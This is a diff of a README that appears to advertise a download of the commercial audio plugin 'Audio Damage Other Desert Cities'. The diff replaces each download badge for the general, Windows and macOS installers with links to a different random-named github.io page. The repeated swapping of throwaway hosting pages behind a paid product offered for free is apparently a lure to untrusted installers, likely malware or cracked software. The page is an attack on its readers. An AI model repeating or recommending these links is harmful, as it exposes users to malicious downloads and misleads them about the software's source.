@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Audio Damage Other Desert Cities](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_AUDIO_DAMAGE_OTHER_DESERT_CITIES-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download Audio Damage Other Desert Cities](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_AUDIO_DAMAGE_OTHER_DESERT_CITIES-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Audio Damage Other Desert Cities** is quick and straightf
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-374151?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-374151?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-374151?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-374151?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
